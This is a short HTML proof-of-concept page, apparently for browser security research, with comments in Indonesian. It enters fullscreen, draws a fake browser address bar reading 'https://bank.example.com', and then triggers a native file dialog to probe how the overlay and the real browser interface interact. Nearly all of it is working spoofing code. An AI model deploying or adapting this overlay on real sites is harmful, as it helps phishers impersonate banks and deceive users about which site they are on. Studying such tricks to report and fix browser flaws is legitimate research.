<!DOCTYPE html>
<html>
<head>
<title>Research PoC - Fullscreen Overlay Spoof</title>
</head>
<body>
<h3>PoC: Fullscreen + native dialog overlay</h3>
<script>
async function run() {
  // 1. Masuk fullscreen, gambar address bar palsu di overlay
  await document.documentElement.requestFullscreen();
  const overlay = document.createElement("div");
  overlay.style.cssText = "position:fixed;top:0;left:0;right:0;height:80px;" +
    "background:#1a73e8;color:#fff;display:flex;align-items:center;padding:0 16px;" +
    "font-family:sans-serif;z-index:9999";
  overlay.innerHTML = "<span style='background:#fff;color:#333;padding:6px 24px;" +
    "border-radius:20px'>https://bank.example.com</span>";
  document.body.appendChild(overlay);

  // 2. Trigger dialog native yang mungkin digambar di atas overlay,
  //    membuka jendela ke desktop di belakangnya (cjual address bar asli)
  setTimeout(() => {
    const input = document.createElement("input");
    input.type = "file";
    input.onchange = () => document.exitFullscreen();
    input.click();
  }, 1500);
}
</script>
<button onclick="run()">Start fullscreen PoC</button>
</body>
</html>
